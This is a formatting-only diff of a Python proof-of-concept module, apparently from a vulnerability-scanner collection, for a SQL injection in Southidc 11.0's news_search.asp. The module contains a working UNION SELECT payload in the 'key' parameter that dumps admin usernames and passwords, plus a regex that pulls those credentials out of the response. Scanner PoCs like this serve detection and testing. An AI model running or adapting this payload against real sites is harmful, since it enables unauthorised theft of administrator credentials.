@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Southidc_0001' # 平台漏洞编号，留空
+    vuln_id = 'Southidc_0001'  # 平台漏洞编号，留空
     name = 'Southidc 南方数据 11.0 /news_search.asp SQL注入漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2012-6-30'  # 漏洞公布时间
     desc = '''
         southidc v10.0到v11.0版本中news_search.asp文件对key参数没有适当过滤，导致SQL注入漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Southidc'  # 漏洞应用名称
     product_version = 'v10.0到v11.0'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'c3b73d06-54d7-4126-adae-1913dd0616ac'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             verify_url = self.target + '/news_search.asp?'
             payload = ("key=7'%20Union%20select%200,username%2bchr(124)%2bpassword,"
                        "2,3,4,5,6,7,8,9%20from%20admin%20where%1%20or%20''='&otype=title&Submit=%CB%D1%CB%F7")
@@ -41,7 +43,8 @@ class Poc(ABPoc):
             content = res.read()
 
             if res.code == 200:
-                pattern = re.compile(r'.*?\">(?P<username>[a-zA-Z0-9]+)\|(?P<password>[a-zA-Z0-9]+)',re.I|re.S)
+                pattern = re.compile(
+                    r'.*?\">(?P<username>[a-zA-Z0-9]+)\|(?P<password>[a-zA-Z0-9]+)', re.I | re.S)
                 match = pattern.match(content)
                 if match:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -52,6 +55,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
